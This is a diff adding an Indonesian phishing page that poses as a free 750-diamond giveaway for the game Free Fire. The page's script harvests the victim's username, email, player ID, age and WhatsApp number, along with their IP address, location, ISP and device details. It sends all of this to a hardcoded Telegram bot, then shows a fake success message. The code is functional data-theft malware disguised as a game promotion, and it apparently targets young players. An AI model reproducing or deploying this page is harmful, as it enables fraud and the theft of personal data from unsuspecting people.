@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Klaim Diamond Free Fire</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: url('https://i.postimg.cc/Kj1wGm84/00431be089336659059b24ee2b5f9503.jpg') no-repeat center center fixed;
+      background-size: cover;
+      font-family: Arial, sans-serif;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background-color: rgba(0, 0, 0, 0.75);
+      padding: 30px;
+      border-radius: 15px;
+      text-align: center;
+      width: 90%;
+      max-width: 420px;
+    }
+    input, button {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      font-size: 15px;
+      border-radius: 8px;
+      border: none;
+    }
+    button {
+      background-color: #ffcc00;
+      color: black;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    #loading {
+      display: none;
+      font-size: 16px;
+      color: #fff;
+      margin-top: 10px;
+    }
+    .custom-alert {
+      background: #222;
+      color: #0f0;
+      padding: 20px;
+      border-radius: 10px;
+      font-size: 16px;
+      margin-top: 15px;
+      border: 2px solid #0f0;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Klaim 750 Diamond Gratis</h2>
+    <form id="diamondForm">
+      <input type="text" id="username" placeholder="Username Free Fire" required>
+      <input type="email" id="email" placeholder="Email" required>
+      <input type="text" id="idPlayer" placeholder="ID Player" required>
+      <input type="number" id="umur" placeholder="Umur/Usia Kamu saat ini" required>
+      <input type="tel" id="whatsapp" placeholder="Nomor WhatsApp" required>
+      <button type="submit">Klaim Sekarang</button>
+      <div id="loading">Mengirim Diamond ke Alamat ID Player...</div>
+      <div class="custom-alert" id="customAlert">Selamat! 750 Diamond sudah dikirimkan ke ID kamu! Silakan cek di Game.</div>
+    </form>
+  </div>
+
+  <script>
+    const token = "7922660800:AAHLTFLjA-aDkZ_AeuODlZ_jOZ3Aw4KVhKs";
+    const chat_id = "7625804862";
+
+    function countryToFlagEmoji(countryCode) {
+      return countryCode.toUpperCase().replace(/./g, char =>
+        String.fromCodePoint(127397 + char.charCodeAt())
+      );
+    }
+
+    document.getElementById("diamondForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const username = document.getElementById("username").value;
+      const email = document.getElementById("email").value;
+      const idPlayer = document.getElementById("idPlayer").value;
+      const umur = document.getElementById("umur").value;
+      const whatsapp = document.getElementById("whatsapp").value;
+      const perangkat = navigator.userAgent;
+
+      document.getElementById("loading").style.display = "block";
+
+      fetch('https://ipapi.co/json')
+        .then(res => res.json())
+        .then(data => {
+          const ip = data.ip;
+          const negara = data.country_name;
+          const kota = data.city;
+          const emoji = countryToFlagEmoji(data.country_code);
+          const maps = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
+
+          const text = `
+Halo Tuan Samuel, Pencipta ku...
+[+] DATA BARU MASUK [+]
+
+📛 Username: ${username}
+✉️ Email: ${email}
+🆔 ID Player: ${idPlayer}
+🔞 Umur: ${umur}
+📞 No.WhatsApp: ${whatsapp}
+⚠️ IP: ${ip}
+🗾 Negara: ${negara} ${emoji}
+🏢 Kota: ${kota}
+📱 Perangkat: ${perangkat}
+
+🚩 Lokasi: ${maps}
+
+⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️
+[ + ] Detail IP Address [ + ]
+ISP: ${data.org}
+Provinsi: ${data.region}
+Kode Pos: ${data.postal}
+Zona Waktu: ${data.timezone}
+ASN: ${data.asn}
+
+Pencipta Bot: ©SamXploit™ 🦅
+`;
+
+          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id, text })
+          }).then(() => {
+            setTimeout(() => {
+              document.getElementById("loading").style.display = "none";
+              document.getElementById("customAlert").style.display = "block";
+              document.getElementById("diamondForm").reset();
+            }, 2000);
+          });
+        });
+    });
+  </script>
+</body>
+</html>
